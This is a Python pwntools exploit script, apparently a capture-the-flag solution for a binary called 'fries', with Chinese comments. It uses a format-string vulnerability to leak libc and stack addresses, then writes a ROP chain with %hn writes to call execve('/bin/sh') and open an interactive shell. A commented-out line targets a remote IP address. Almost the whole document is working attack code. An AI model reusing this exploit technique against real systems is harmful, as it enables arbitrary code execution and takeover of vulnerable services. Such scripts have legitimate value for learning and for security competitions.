from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p       = process('./fries')
#p       = remote('43.249.195.138', 22080)
#libc    = ELF('./libc.so.6')
libc    = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
elf     = ELF('./fries')

p.recvuntil('Emmmmm... Could you give me some fries\n')
p.send('fries\x00')
# 泄露glibc的地址
p.recvuntil('Go get some fries on the pier\n')
payload = b'%59$p'
p.send(payload)
libc_start_main = int(p.recvuntil('Go get some fries on the pier\n')[:14], 16) - 128
# 计算出gadget地址
libc_base   = libc_start_main - libc.symbols['__libc_start_main']
execve      = libc_base + libc.symbols['execve']
binsh       = libc_base + next(libc.search(b'/bin/sh\x00'))
pop_rdi     = libc_base + 0x2a3e5
pop_rsi     = libc_base + 0x2be51

# 泄露栈地址
payload = b'%24$p'
p.send(payload)
rbp     = int(p.recvuntil('Go get some fries on the pier\n')[:14], 16) - 0x50
ret1    = rbp   + 8
ret2    = ret1  + 8
ret3    = ret2  + 8
ret4    = ret3  + 8
ret5    = ret4  + 8

# str的起始地址 : ("%8$p")
# 写入地址gadget是写入的值, target是写入的地址
def run(gadget, target):
    payload = b''
    write_size = 0
    for i in range(3):
        vulen  = (gadget>>(i*16)) & 0xffff
        # 如果已经输入的字符大于了将要输入的值, 那么我们就需要输入对应的负数
        if(vulen > write_size&0xffff):
            payload += b'%' + bytes(str(vulen - (write_size&0xffff)).encode()) + b'c%' + bytes(str(13 + i).encode()) + b'$hn'
            write_size+=vulen - (write_size&0xffff)
        else:
            payload += b'%' + bytes(str(0x10000 - (write_size&0xffff) + vulen).encode()) + b'c%' + bytes(str(13 + i).encode()) + b'$hn'
            write_size+=0x10000 - (write_size&0xffff) + vulen
    payload  = payload.ljust(40, b'a')
    payload += p64(target)
    payload += p64(target + 2)
    payload += p64(target + 4)
    p.send(payload)
    p.recvuntil('Go get some fries on the pier\n')

run(pop_rdi, ret1)
run(binsh, ret2)
run(pop_rsi, ret3)
run(0, ret4)
run(execve, ret5)

p.send(b'aaaa\x00')
#gdb.attach(p, 'b read\nb printf\n')
p.interactive()
